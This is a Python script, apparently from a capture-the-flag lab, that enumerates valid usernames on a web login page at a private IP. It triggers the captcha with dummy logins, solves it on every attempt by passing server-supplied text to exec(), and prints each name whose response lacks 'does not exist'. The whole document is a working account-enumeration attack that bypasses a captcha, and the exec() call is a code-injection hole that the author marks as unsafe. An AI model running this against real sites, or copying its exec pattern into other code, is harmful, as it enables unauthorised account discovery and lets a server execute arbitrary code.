import requests
import re

target_ip = "10.10.240.252"
usernames_file = "/media/sf_shared/usernames.txt"

with open(usernames_file, "r") as f:
	usernames = f.readlines()

#Initial attempts
for i in range(10):
	data = {"username": "test", "password": "test"}
	response = requests.post("http://" + target_ip + "/login", data=data)

for username in usernames:
	#Finding and solving the captcha
	captcha = re.findall("[0-9]* + .* = \?", str(response.content, "utf-8"))
	exec("solution =" + captcha[0][4:-4]) #Unsafe!!!
	
	#Making the attempt
	data = {"username": username[:-1], "password": "test", "captcha": solution}
	response = requests.post("http://" + target_ip + "/login", data=data)
	
	#Checking if username exists
	if ("does not exist" not in str(response.content, "utf-8")):
		print(username[:-1])
